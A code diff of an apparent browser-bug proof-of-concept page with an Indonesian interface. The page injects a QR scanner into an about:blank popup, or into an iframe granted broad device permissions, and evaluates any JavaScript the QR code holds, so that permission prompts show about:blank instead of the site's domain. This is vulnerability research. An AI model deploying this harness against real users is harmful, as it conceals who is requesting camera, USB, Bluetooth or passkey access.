@@ -3,54 +3,74 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>QR Scanner in about:blank — PoC (final)</title>
+<title>QR Scanner in about:blank — PoC</title>
+<meta name="description" content="Security research: QR-triggered JS executor in about:blank popup">
 <style>
-  body { font-family: system-ui, -apple-system, sans-serif; max-width: 820px; margin: 0 auto; padding: 24px; line-height: 1.55; background: #f7f7f7; }
+  * { box-sizing: border-box; }
+  body { font-family: system-ui, -apple-system, sans-serif; max-width: 860px; margin: 0 auto; padding: 24px; line-height: 1.55; background: #f7f7f7; color: #222; }
   h1 { font-size: 1.3em; margin-top: 0; }
   h2 { font-size: 1.05em; margin-top: 0; }
   .warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
   .danger { background: #f8d7da; border-left: 4px solid #dc3545; padding: 12px 14px; border-radius: 4px; margin: 12px 0; font-size: 14px; }
   .card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); margin: 16px 0; }
-  button { padding: 12px 22px; font-size: 15px; border-radius: 6px; border: 0; cursor: pointer; background: #007bff; color: #fff; font-weight: 500; }
-  button:hover { background: #0056b3; }
+  button { padding: 12px 22px; font-size: 15px; border-radius: 6px; border: 0; cursor: pointer; background: #007bff; color: #fff; font-weight: 500; margin: 4px 4px 4px 0; }
+  button:hover:not(:disabled) { background: #0056b3; }
+  button:disabled { background: #ccc; cursor: not-allowed; }
+  button.success { background: #28a745; }
+  button.success:hover:not(:disabled) { background: #1e7e34; }
   button.gray { background: #6c757d; }
-  button.gray:hover { background: #495057; }
-  code { background: #eee; padding: 2px 6px; border-radius: 3px; font-family: monospace; font-size: 13px; }
-  ol { padding-left: 20px; margin: 8px 0; }
+  button.gray:hover:not(:disabled) { background: #495057; }
+  code { background: #eee; padding: 2px 6px; border-radius: 3px; font-family: ui-monospace, monospace; font-size: 13px; }
+  ol, ul { padding-left: 20px; margin: 8px 0; }
   li { margin: 6px 0; }
-  #diag { font-family: monospace; font-size: 12px; background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px; margin: 12px 0; }
+  #diag { font-family: ui-monospace, monospace; font-size: 12px; background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px; margin: 12px 0; }
   #diag div { margin: 3px 0; }
-  #diag .label { color: #666; display: inline-block; width: 180px; }
+  #diag .label { color: #666; display: inline-block; width: 200px; }
   #status { margin-top: 12px; display: none; }
+  #iframeFallback { display: none; margin-top: 16px; }
+  #iframeFallback iframe { width: 100%; height: 820px; border: 1px solid #ddd; border-radius: 6px; background: #fff; }
 </style>
 </head>
 <body>
 
 <h1>📷 QR → <code>about:blank</code> → Eksekusi</h1>
 
-<div class="danger">
-  <strong>⚠️ SECURITY RESEARCH TOOL</strong> — jalankan hanya di <code>localhost</code> / domain Anda sendiri.
+<div class="danger"><strong>⚠️ SECURITY RESEARCH TOOL</strong> — jalankan hanya di <code>localhost</code> / domain Anda sendiri.</div>
+
+<div class="warn">
+  <strong>Deploy di Vercel?</strong>
+  <ul style="margin:6px 0 0 0;">
+    <li>Klik ikon 🔒/🚫 di address bar → izinkan <strong>popups</strong> + <strong>camera</strong>.</li>
+    <li>Kalau popup diblokir, scanner otomatis pindah ke iframe fallback di bawah.</li>
+  </ul>
 </div>
 
 <div id="diag">
   <div><span class="label">isSecureContext:</span><strong id="d-sec">?</strong></div>
-  <div><span class="label">window.open:</span><strong id="d-open">?</strong></div>
+  <div><span class="label">location.origin:</span><strong id="d-origin">?</strong></div>
+  <div><span class="label">camera permission:</span><strong id="d-camperm">?</strong></div>
   <div><span class="label">BarcodeDetector:</span><strong id="d-bd">?</strong></div>
-  <div><span class="label">protocol:</span><strong id="d-proto">?</strong></div>
-  <div><span class="label">referrer:</span><strong id="d-ref">?</strong></div>
+  <div><span class="label">window.open:</span><strong id="d-open">?</strong></div>
 </div>
 
 <div class="card">
-  <h2>Cara kerja</h2>
+  <h2>Langkah</h2>
   <ol>
-    <li>Klik <strong>Buka QR Scanner</strong> → popup <code>about:blank</code> terbuka.</li>
-    <li>Di dalam popup: klik <strong>Start Camera</strong>, arahkan ke QR code.</li>
-    <li>QR terdeteksi → klik <strong>Execute</strong>.</li>
-    <li>Permission dialog (Bluetooth/USB/Serial/Passkey/dll.) menampilkan <code>about:blank</code>, bukan domain Anda → bug terbukti.</li>
+    <li><strong>Grant Camera Permission</strong> — wajib, supaya popup <code>about:blank</code> bisa akses kamera.</li>
+    <li><strong>Open QR Scanner</strong> — popup <code>about:blank</code> terbuka. Kalau diblokir → iframe fallback.</li>
+    <li>Scan QR (kamera atau upload foto), klik <strong>Execute</strong>.</li>
+    <li>Permission dialog (Bluetooth/USB/Passkey/dll.) tampil dengan <code>about:blank</code> → bug terbukti.</li>
   </ol>
-  <button id="openBtn">▶ Buka QR Scanner (about:blank)</button>
-  <button id="testBtn" class="gray">🧪 Test Popup Sederhana</button>
+  <button id="warmBtn" class="success">1. ✅ Grant Camera Permission</button>
+  <button id="openBtn" disabled>2. ▶ Open QR Scanner (about:blank)</button>
+  <button id="testBtn" class="gray">🧪 Test Popup</button>
   <div id="status"></div>
+</div>
+
+<div id="iframeFallback">
+  <h2>Iframe fallback (<code>about:srcdoc</code>)</h2>
+  <p style="font-size:13px;color:#666;">Popup diblokir — scanner di-render di iframe. URL dokumen = <code>about:srcdoc</code>, origin = domain Anda.</p>
+  <iframe id="fallbackIframe" allow="camera; microphone; bluetooth; usb; serial; hid; midi; publickey-credentials-get; publickey-credentials-create; payment; screen-wake-lock; idle-detection" srcdoc=""></iframe>
 </div>
 
 <script>
@@ -67,21 +87,98 @@
       (colors[type] || '#666') + ';background:#fff;font-size:13px;">' + html + '</div>';
   }
 
-  /* ---------- Diagnostik ---------- */
-  $('d-sec').textContent   = window.isSecureContext;
-  $('d-open').textContent  = typeof window.open;
-  $('d-bd').textContent    = ('BarcodeDetector' in window);
-  $('d-proto').textContent = location.protocol;
-  $('d-ref').textContent   = document.referrer || '(none)';
-  if (!window.isSecureContext) $('d-sec').innerHTML = '<span style="color:#dc3545">false ⚠️</span>';
+  $('d-sec').textContent = window.isSecureContext;
+  $('d-origin').textContent = location.origin;
+  $('d-bd').textContent = ('BarcodeDetector' in window);
+  $('d-open').textContent = typeof window.open;
 
-  /* ---------- Inject HTML ke popup via DOM ---------- */
+  try {
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'camera' })
+        .then(function (p) {
+          $('d-camperm').textContent = p.state;
+          p.onchange = function () { $('d-camperm').textContent = p.state; };
+        })
+        .catch(function () { $('d-camperm').textContent = 'query failed'; });
+    } else {
+      $('d-camperm').textContent = 'unsupported';
+    }
+  } catch (e) {
+    $('d-camperm').textContent = 'unsupported';
+  }
+
+  /* ---------- Warm up camera ---------- */
+  $('warmBtn').addEventListener('click', async function () {
+    setStatus('Meminta izin kamera…', 'info');
+    try {
+      var s = await navigator.mediaDevices.getUserMedia({ video: true });
+      s.getTracks().forEach(function (t) { t.stop(); });
+      $('openBtn').disabled = false;
+      setStatus('✅ Izin kamera granted. Lanjut ke langkah 2.', 'ok');
+    } catch (e) {
+      setStatus(
+        '<strong>❌ Kamera gagal:</strong> <code>' + e.name + ': ' + e.message + '</code><br>' +
+        '<small><code>NotAllowedError</code>: klik 🔒 di address bar → izinkan kamera, ulangi.<br>' +
+        '<code>NotFoundError</code>: tidak ada kamera terpasang.</small>',
+        'err');
+    }
+  });
+
+  /* ---------- Open popup ---------- */
+  $('openBtn').addEventListener('click', function () {
+    statusEl.style.display = 'none';
+    setStatus('Membuka popup…', 'info');
+
+    var w = openBlankWindow();
+    if (!w) {
+      showIframeFallback();
+      setStatus(
+        '<strong>⚠️ Popup diblokir.</strong> Scanner muncul di iframe fallback di bawah.<br>' +
+        'Untuk popup sungguhan: klik ikon 🚫 di address bar → <em>Always allow popups</em> → ulangi.',
+        'warn');
+      return;
+    }
+
+    try {
+      var ok = injectPopup(w);
+      if (ok) {
+        var info = '';
+        try {
+          info = ' <code>href=' + w.location.href + '</code>, <code>origin=' + w.location.origin + '</code>';
+        } catch (e) {
+          info = ' <span style="color:#dc3545">(origin tidak terbaca: ' + e.name + ')</span>';
+        }
+        setStatus('✅ Popup <code>about:blank</code> terbuka.' + info + '<br>Lanjut scan QR di jendela popup.', 'ok');
+      } else {
+        setStatus('⚠️ Popup terbuka tapi konten gagal di-inject. Cek Console (F12).', 'warn');
+      }
+    } catch (e) {
+      setStatus('❌ Gagal inject: <code>' + e.message + '</code>', 'err');
+      console.error('[PoC] inject failed:', e);
+    }
+    w.focus();
+  });
+
+  function openBlankWindow() {
+    var attempts = [
+      function () { return window.open('', '_blank', 'width=920,height=900'); },
+      function () { return window.open('about:blank', '_blank', 'width=920,height=900'); },
+      function () { return window.open('', '_blank'); },
+      function () { return window.open('about:blank', '_blank'); }
+    ];
+    for (var i = 0; i < attempts.length; i++) {
+      var w = null;
+      try { w = attempts[i](); } catch (e) {}
+      if (w && !w.closed) { console.log('[PoC] popup attempt', i + 1); return w; }
+    }
+    return null;
+  }
+
   function injectPopup(w) {
     var doc = w.document;
     var parser = new DOMParser();
     var parsed = parser.parseFromString(popupHTML(), 'text/html');
 
-    // Copy <style> ke <head>
     var styles = parsed.querySelectorAll('style');
     for (var i = 0; i < styles.length; i++) {
       var ns = doc.createElement('style');
@@ -89,11 +186,9 @@
       doc.head.appendChild(ns);
     }
 
-    // Body tanpa <script> (innerHTML tidak eksekusi script)
     var bodyHTML = parsed.body.innerHTML.replace(/<script[\s\S]*?<\/script>/gi, '');
     doc.body.innerHTML = bodyHTML;
 
-    // Inject & jalankan <script> manual
     var scripts = parsed.querySelectorAll('script');
     for (var j = 0; j < scripts.length; j++) {
       var sc = doc.createElement('script');
@@ -101,57 +196,31 @@
       else sc.textContent = scripts[j].textContent;
       doc.body.appendChild(sc);
     }
-
     return !!doc.getElementById('startBtn');
   }
 
-  /* ---------- Handler utama ---------- */
-  $('openBtn').addEventListener('click', function () {
-    statusEl.style.display = 'none';
-    setStatus('Membuka popup…', 'info');
-
-    var w = window.open('about:blank', '_blank', 'width=920,height=900,resizable=yes');
-    if (!w) {
-      setStatus(
-        '<strong>❌ Popup diblokir.</strong><br>' +
-        'Klik ikon 🚫 di address bar → <em>Always allow popups</em> → coba lagi.<br>' +
-        'Atau host via <code>http://localhost:8000/</code> (bukan <code>file://</code>).',
-        'err');
-      return;
-    }
-
-    try {
-      var ok = injectPopup(w);
-      if (ok) {
-        setStatus('✅ Popup <code>about:blank</code> berisi scanner. Lanjut di jendela popup.', 'ok');
-      } else {
-        setStatus('⚠️ Konten terinject tapi tombol scanner tidak ditemukan. Cek Console (F12).', 'warn');
-      }
-    } catch (e) {
-      setStatus('❌ Gagal inject: <code>' + e.message + '</code>', 'err');
-      console.error('[PoC] inject failed:', e);
-    }
-
-    w.focus();
-  });
+  function showIframeFallback() {
+    var iframe = $('fallbackIframe');
+    if (!iframe.dataset.loaded) { iframe.srcdoc = popupHTML(); iframe.dataset.loaded = '1'; }
+    $('iframeFallback').style.display = 'block';
+    $('iframeFallback').scrollIntoView({ behavior: 'smooth' });
+  }
 
   /* ---------- Test popup ---------- */
   $('testBtn').addEventListener('click', function () {
     statusEl.style.display = 'none';
     var w = window.open('about:blank', '_blank', 'width=400,height=300');
-    if (!w) { setStatus('❌ Test popup juga diblokir — masalah di popup blocker browser.', 'err'); return; }
+    if (!w) { setStatus('❌ Popup diblokir bahkan untuk test. Popup blocker aktif.', 'err'); return; }
     try {
       var doc = w.document;
-      var style = doc.createElement('style');
-      style.textContent = 'body{font-family:system-ui;padding:20px}code{background:#eee;padding:2px 5px}';
-      doc.head.appendChild(style);
       doc.body.innerHTML = '<h2>✅ Test OK</h2>' +
         '<p>href: <code>about:blank</code></p>' +
-        '<p>origin: <code>' + (doc.location ? doc.location.origin : '?') + '</code></p>' +
-        '<p>Popup bekerja normal (DOM injection).</p>';
+        '<p>origin (popup): <code>' + doc.location.origin + '</code></p>' +
+        '<p>origin (parent): <code>' + w.location.origin + '</code></p>' +
+        '<p>window.opener: <code>' + (w.opener ? 'connected' : 'null') + '</code></p>';
       setStatus('✅ Test popup berhasil. Mekanisme popup OK.', 'ok');
     } catch (e) {
-      setStatus('⚠️ Popup terbuka tapi DOM inject gagal: <code>' + e.message + '</code>', 'err');
+      setStatus('⚠️ Popup terbuka tapi DOM gagal: <code>' + e.name + ': ' + e.message + '</code>', 'err');
     }
   });
 
@@ -166,22 +235,25 @@
   body { font-family: system-ui, -apple-system, sans-serif; max-width: 760px; margin: 0 auto; padding: 18px; background: #fafafa; line-height: 1.5; }
   h2 { margin-top: 0; font-size: 1.15em; }
   h3 { font-size: 1em; margin: 16px 0 6px; }
-  .meta { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px 12px; font-size: 13px; font-family: monospace; }
+  .meta { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 10px 12px; font-size: 13px; font-family: ui-monospace, monospace; }
   .meta div { margin: 2px 0; }
   .meta .label { color: #666; display: inline-block; width: 120px; }
   video { width: 100%; max-width: 480px; border-radius: 8px; background: #000; display: block; margin: 12px auto; }
   button { padding: 9px 16px; font-size: 14px; border-radius: 5px; border: 0; cursor: pointer; background: #007bff; color: #fff; margin: 4px 4px 4px 0; }
-  button:hover { background: #0056b3; }
+  button:hover:not(:disabled) { background: #0056b3; }
   button:disabled { background: #ccc; cursor: not-allowed; }
   button.gray { background: #6c757d; }
-  button.gray:hover { background: #495057; }
+  button.gray:hover:not(:disabled) { background: #495057; }
   button.danger { background: #dc3545; }
-  button.danger:hover { background: #a71d2a; }
-  pre { background: #f4f4f4; border: 1px solid #e0e0e0; border-radius: 6px; padding: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-size: 12px; font-family: monospace; min-height: 40px; }
-  textarea { width: 100%; min-height: 70px; font-family: monospace; font-size: 12px; padding: 8px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
+  button.danger:hover:not(:disabled) { background: #a71d2a; }
+  button.success { background: #28a745; }
+  pre { background: #f4f4f4; border: 1px solid #e0e0e0; border-radius: 6px; padding: 10px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-size: 12px; font-family: ui-monospace, monospace; min-height: 40px; }
+  textarea { width: 100%; min-height: 70px; font-family: ui-monospace, monospace; font-size: 12px; padding: 8px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
   .status { font-size: 13px; color: #555; margin-top: 6px; }
   .ok { color: #28a745; }
   .err { color: #dc3545; }
+  #fileFallback { display: none; margin-top: 12px; padding: 12px; background: #fff3cd; border-radius: 6px; border-left: 4px solid #ffc107; }
+  #fileFallback label { display: block; margin-top: 8px; }
 </style>
 </head>
 <body>
@@ -189,7 +261,7 @@
 <div class="meta">
   <div><span class="label">location.href:</span><strong id="mHref">?</strong></div>
   <div><span class="label">location.origin:</span><strong id="mOrigin">?</strong></div>
-  <div><span class="label">window.origin:</span><strong id="mWinOrigin">?</strong></div>
+  <div><span class="label">window.opener:</span><strong id="mOpener">?</strong></div>
   <div><span class="label">isSecureContext:</span><strong id="mSec">?</strong></div>
 </div>
 <h3>1. Scan QR</h3>
@@ -199,6 +271,11 @@
   <button id="stopBtn" class="gray" disabled>⏹ Stop</button>
 </div>
 <div class="status" id="scanStatus">Kamera idle.</div>
+<div id="fileFallback">
+  <strong>⚠️ Kamera tidak bisa diakses.</strong> Pakai fallback:
+  <label><input type="file" accept="image/*" capture="environment" id="fileCapture" style="display:none"><button type="button" id="captureBtn" class="success">📷 Take Photo</button></label>
+  <label><input type="file" accept="image/*" id="fileUpload" style="display:none"><button type="button" id="uploadBtn">🖼 Upload Image</button></label>
+</div>
 <h3>2. Hasil &amp; Eksekusi</h3>
 <pre id="result">(belum ada QR terdeteksi)</pre>
 <button id="execBtn" class="danger" disabled>🚀 Execute di about:blank ini</button>
@@ -211,10 +288,10 @@
 (function(){
   'use strict';
   var $ = function(id){ return document.getElementById(id); };
-  $('mHref').textContent      = location.href;
-  $('mOrigin').textContent    = location.origin;
-  $('mWinOrigin').textContent = window.origin || '(undefined)';
-  $('mSec').textContent       = window.isSecureContext;
+  $('mHref').textContent = location.href;
+  $('mOrigin').textContent = location.origin;
+  $('mOpener').textContent = window.opener ? 'connected' : 'null (severed)';
+  $('mSec').textContent = window.isSecureContext;
 
   var stream = null, rafId = null, detector = null, jsQRReady = false;
   var scanActive = false, scannedCode = '';
@@ -253,7 +330,8 @@
       $('stopBtn').disabled = false;
       loop();
     } catch (e) {
-      $('scanStatus').innerHTML = '<span class="err">❌ ' + e.name + ': ' + e.message + '</span>';
+      $('scanStatus').innerHTML = '<span class="err">❌ Kamera gagal: ' + e.name + ': ' + e.message + '</span>';
+      $('fileFallback').style.display = 'block';
     }
   }
 
@@ -267,10 +345,7 @@
         ctx.drawImage(v, 0, 0, w, h);
         var found = null;
         if (detector) {
-          try {
-            var codes = await detector.detect(canvas);
-            if (codes && codes.length) found = codes[0].rawValue;
-          } catch (e) {}
+          try { var codes = await detector.detect(canvas); if (codes && codes.length) found = codes[0].rawValue; } catch (e) {}
         } else if (jsQRReady && typeof jsQR !== 'undefined') {
           try {
             var img = ctx.getImageData(0, 0, w, h);
@@ -297,8 +372,7 @@
     $('result').textContent = code;
     $('execBtn').disabled = false;
     $('scanStatus').innerHTML = '<span class="ok">✅ QR terdeteksi.</span>';
-    beep();
-    stopScan();
+    beep(); stopScan();
   }
 
   function beep() {
@@ -323,23 +397,46 @@
     if (!code) { $('execStatus').textContent = '⚠️ Tidak ada kode.'; return; }
     $('log').style.display = 'block';
     $('log').textContent = '► Executing in about:blank…';
-    $('execStatus').textContent = 'Kode dijalankan. Cek apakah permission dialog menampilkan about:blank.';
-    var wrapped =
-      '(async () => {\n' + code + '\n})().catch(e => {' +
+    $('execStatus').textContent = 'Kode dijalankan. Permission dialog (jika muncul) akan menampilkan about:blank.';
+    var wrapped = '(async () => {\n' + code + '\n})().catch(e => {' +
       '  var l = document.getElementById("log");' +
       '  if (l) l.textContent += "\\n✗ " + e.name + ": " + e.message;' +
       '});';
-    try {
-      (0, eval)(wrapped);
-    } catch (e) {
-      $('log').textContent += '\n✗ Sync error: ' + e.name + ': ' + e.message;
-    }
+    try { (0, eval)(wrapped); }
+    catch (e) { $('log').textContent += '\n✗ Sync error: ' + e.name + ': ' + e.message; }
   }
 
-  $('startBtn').onclick  = startScan;
-  $('stopBtn').onclick   = stopScan;
-  $('execBtn').onclick   = function(){ execute(scannedCode); };
+  async function handleFileSelect(e) {
+    var file = e.target.files[0];
+    if (!file) return;
+    var img = new Image();
+    img.onload = async function () {
+      canvas.width = img.width; canvas.height = img.height;
+      ctx.drawImage(img, 0, 0);
+      if (!detector) await ensureDetector();
+      var found = null;
+      if (detector) {
+        try { var codes = await detector.detect(canvas); if (codes && codes.length) found = codes[0].rawValue; } catch (err) {}
+      }
+      if (!found && typeof jsQR !== 'undefined') {
+        var imageData = ctx.getImageData(0, 0, img.width, img.height);
+        var qr = jsQR(imageData.data, img.width, img.height);
+        if (qr) found = qr.data;
+      }
+      if (found) onDetected(found);
+      else $('scanStatus').innerHTML = '<span class="err">❌ QR tidak ditemukan di gambar.</span>';
+    };
+    img.src = URL.createObjectURL(file);
+  }
+
+  $('startBtn').onclick = startScan;
+  $('stopBtn').onclick = stopScan;
+  $('execBtn').onclick = function(){ execute(scannedCode); };
   $('manualBtn').onclick = function(){ execute($('manual').value); };
+  var fc = document.getElementById('fileCapture');
+  var fu = document.getElementById('fileUpload');
+  if (fc) { document.getElementById('captureBtn').onclick = function(){ fc.click(); }; fc.onchange = handleFileSelect; }
+  if (fu) { document.getElementById('uploadBtn').onclick = function(){ fu.click(); }; fu.onchange = handleFileSelect; }
 })();
 <\/script>
 </body>
